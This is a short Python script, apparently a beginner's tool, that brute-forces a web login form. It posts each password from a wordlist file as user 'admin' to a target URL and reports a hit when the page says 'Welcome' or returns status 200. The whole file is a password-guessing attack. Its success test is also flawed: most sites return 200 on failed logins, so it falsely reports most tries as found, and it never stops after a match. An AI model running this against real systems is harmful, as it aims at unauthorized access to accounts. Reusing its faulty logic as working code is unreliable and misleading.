import requests

def brute_force_login(url):
    print(f"Starting brute force on {url}")
    try:
        with open("wordlist.txt","r")as file:
            for line in file:
                password=line.strip()
                data={"username":"admin","password":password}
                response=requests.post(url,data=data)


                if "Welcome" in response.text or response.status_code==200:
                    print(f"password  found {password} \n")
                else:
                    print(f"Incorrect password {password}\n")
    except FileNotFoundError:
        print("wordlist.txt not found")
                    
